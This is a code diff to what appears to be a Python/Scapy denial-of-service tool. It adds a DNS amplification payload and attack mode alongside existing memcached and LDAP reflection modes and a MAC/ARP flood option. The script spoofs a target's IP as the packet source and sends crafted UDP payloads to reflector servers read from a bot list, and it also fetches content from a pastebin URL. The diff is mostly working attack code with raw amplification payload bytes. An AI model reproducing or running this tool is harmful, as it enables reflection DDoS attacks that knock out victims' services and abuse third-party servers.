@@ -38,7 +38,6 @@ def sends(data, port):
 		print(servers)
 		packet = send(IP(dst=servers, src=target)/UDP(dport=port)/Raw(load=data), count=int(powers))
 
-
 def macflood(target, powers):
 	sendp(Ether(src=RandMAC(), dst=target )/ARP(op=2, psrc="0.0.0.0", hwdst=target)/Padding(load="X"*18), count=int(powers))
 
@@ -47,7 +46,8 @@ print("""
 
 1. Memcrashed: -A 1 -T xx.xx.xx.xx -S bot.txt -N 40
 2. LDAP: -A 2 -T xx.xx.xx.xx -S bot.txt -N 40
-3. Mac-flood: -A 3 -T xx.xx.xx.xx -N 40
+3. DNS:  -A 3 -T xx.xx.xx.xx -S bot.txt -N 40
+4. Mac-flood: -A 4 -T FFFF.FFFF.FFFF -N 40
 
 	""")
 req = urllib2.urlopen('https://pastebin.com/raw/eSCHTTVu')
@@ -64,6 +64,9 @@ servers = ''
 
 data = "\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n"
 
+dns  = "\xc4\x75\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\xff\x00\x01\x00\x00\x29\x23\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+
+
 ldap =  "\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a"
 ldap += "\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01"
 ldap += "\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65"
@@ -79,4 +82,6 @@ elif(attack == '1'):
 elif(attack == '2'):
 	sends(ldap, 389)
 elif(attack == '3'):
+  sends(dns, 53)
+elif(attack == '4'):
 	macflood(target, powers)
